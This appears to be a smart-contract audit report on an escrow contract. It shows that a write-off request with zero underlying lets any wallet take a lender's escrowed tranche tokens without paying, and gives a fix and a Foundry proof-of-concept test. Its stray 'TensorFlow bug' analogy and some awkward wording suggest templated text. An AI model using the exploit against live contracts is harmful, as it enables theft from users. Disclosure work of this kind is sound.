### Title
Zero-value write-off requests allow a fulfiller to seize escrowed tranche tokens without paying underlying - ([File: contracts/IdleCreditVaultWriteOffEscrow.sol](contracts/IdleCreditVaultWriteOffEscrow.sol))

### Summary
`createWriteOffRequest` validates that the lender escrows a nonzero tranche amount, but it does not validate that the requested underlying consideration is nonzero. As a result, a lender transaction that accidentally or maliciously front-runs into existence with `underlyingsRequested == 0` creates an executable order in which any EOA can receive all escrowed tranche tokens while paying zero underlying. This is the closest vault-surface analogue to the TensorFlow bug: an externally supplied parameter has an implicit shape/domain requirement, but the missing validation corrupts the expected exchange invariant rather than merely reverting.

### Finding Description
`createWriteOffRequest(amount, underlyingsRequested)` rejects only `amount == 0`; it then escrows `amount` tranche tokens and records `underlyingsRequested` without a lower bound or sanity check [1](#0-0) .

`fullfillWriteOffRequest` requires exact matching of the escrowed tranche amount, but permits any payment greater than or equal to the stored request. If the stored request is zero, `_underlyings = 0` satisfies the check [2](#0-1) .

The fulfilment path then deletes the request, computes a zero fee on zero payment, sends zero underlying to the lender, and transfers the full escrowed tranche position to the fulfiller [3](#0-2) .

### Impact Explanation
Any unprivileged fulfiller can permanently acquire a lender's escrowed AA or BB tranche tokens for no underlying consideration. The broken invariant is fair one-receipt-one-payout exchange: the escrow releases the sole debt-side asset while crediting no payment to the lender. Loss is quantified as the full redemption/recovery value of `amount` tranche tokens, less only whatever recovery rights those tokens would otherwise have preserved. Because the tranche tokens leave the victim's request and go directly to the fulfiller, the victim cannot later delete the request or use the tranche position for withdrawal/default recovery.

### Likelihood Explanation
The bug requires a lender to create a request with `underlyingsRequested == 0`, so exploitation depends on user error, malformed calldata from an integration, or front-running/order-flow misuse rather than arbitrary compromise of a correctly formed request. Once such a request exists, exploitation is permissionless and atomic: `fullfillWriteOffRequest` can be called by any wallet, and no borrower, owner, manager, or privileged role interaction is needed [4](#0-3) .

### Recommendation
Reject zero-consideration requests in `createWriteOffRequest`, for example:

```solidity
if (amount == 0 || underlyingsRequested == 0) revert NotAllowed();
```

If zero-priced debt transfer is intentionally supported, it should be a separate explicitly named flow rather than an accidental edge case of a purchase request. Consider also requiring a nonzero realized payment in `fullfillWriteOffRequest` after the fee calculation so requests cannot settle for `0` underlying through rounding.

### Proof of Concept

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "./IdleCreditVaultWriteOffEscrow.t.sol";

contract WriteOffZeroConsiderationPoC is TestIdleCreditVaultWriteOffEscrow {
  function testFulfillerSeizesTranchesForZeroUnderlying() external {
    address victim = makeAddr("victim");
    address fulfiller = makeAddr("fulfiller");
    uint256 trancheAmount = 100e18;

    // Pool must be in a running epoch for request creation.
    _stopCurrentEpoch();
    vm.prank(manager);
    cdoEpoch.startEpoch();

    // Victim escrows real tranche tokens but malformed input requests zero underlying.
    deal(address(tranche), victim, trancheAmount);
    vm.startPrank(victim);
    tranche.approve(address(escrow), trancheAmount);
    escrow.createWriteOffRequest(trancheAmount, 0);
    vm.stopPrank();

    assertEq(tranche.balanceOf(address(escrow)), trancheAmount);
    assertEq(escrow.pendingUnderlyings(), 0);

    // No underlying approval or balance is needed: requested consideration is zero.
    vm.prank(fulfiller);
    escrow.fullfillWriteOffRequest(victim, trancheAmount, 0);

    // Victim receives nothing and loses the entire escrowed tranche position.
    assertEq(underlying.balanceOf(victim), 0);
    assertEq(tranche.balanceOf(victim), 0);
    assertEq(tranche.balanceOf(fulfiller), trancheAmount);

    (uint256 tranches, uint256 underlyings) = escrow.userRequests(victim);
    assertEq(tranches, 0);
    assertEq(underlyings, 0);
    assertEq(escrow.pendingUnderlyings(), 0);
  }
}
```

This PoC follows the contract's actual accounting: the zero payment passes `_underlyings < currentRequest.underlyings`, the request is deleted before transfers, the zero fee remains zero, and `_tranches` is sent to the attacker [5](#0-4) .

  function createWriteOffRequest(uint256 amount, uint256 underlyingsRequested) external nonReentrant {
    // can request write off only when epoch is running
    if (!IdleCDOEpochVariant(idleCDOEpoch).isEpochRunning()) revert EpochNotRunning();
    // cannot request write off with 0 tranche tokens
    if (amount == 0) revert NotAllowed();

    // get tranche tokens from user
    IERC20Detailed(tranche).safeTransferFrom(msg.sender, address(this), amount);
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[msg.sender];
    // update user requests
    userRequests[msg.sender] = WriteOffRequest({
      tranches: currentRequest.tranches + amount,
      underlyings: currentRequest.underlyings + underlyingsRequested
    });
    pendingUnderlyings += underlyingsRequested;

  /// @param _underlyings amount of underlyings to transfer
  /// @dev this function can be called by any wallet
  function fullfillWriteOffRequest(address _user, uint256 _tranches, uint256 _underlyings) external nonReentrant {
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[_user];
    // check if the user has a write-off request
    if (currentRequest.tranches == 0) revert Is0();
    // check if the request matches at least the expected values (borrower can choose to overpay if needed, but not underpay)
    if (currentRequest.tranches != _tranches || _underlyings < currentRequest.underlyings) {
      revert WrongRequest();
    }

    // Existing upgraded escrows can have legacy requests that were never added to pendingUnderlyings.
    pendingUnderlyings -= pendingUnderlyings >= currentRequest.underlyings ? currentRequest.underlyings : pendingUnderlyings;
    delete userRequests[_user];

    IERC20Detailed underlyingToken = IERC20Detailed(underlying);
    // transfer underlyings requested from the fulfiller to this contract
    underlyingToken.safeTransferFrom(msg.sender, address(this), _underlyings);
    // check if the exit fee is set and if so, apply it
    uint256 _exitFee = exitFee;
    uint256 _totFee;
    if (_exitFee > 0) {
      _totFee = (_underlyings * _exitFee) / FULL_VALUE;
      // transfer exit fee to the feeReceiver
      underlyingToken.safeTransfer(feeReceiver, _totFee);
    }
    // transfer the remaining underlyings to the user
    underlyingToken.safeTransfer(_user, _underlyings - _totFee);
    // transfer tranche tokens to fulfiller
    IERC20Detailed(tranche).safeTransfer(msg.sender, _tranches);
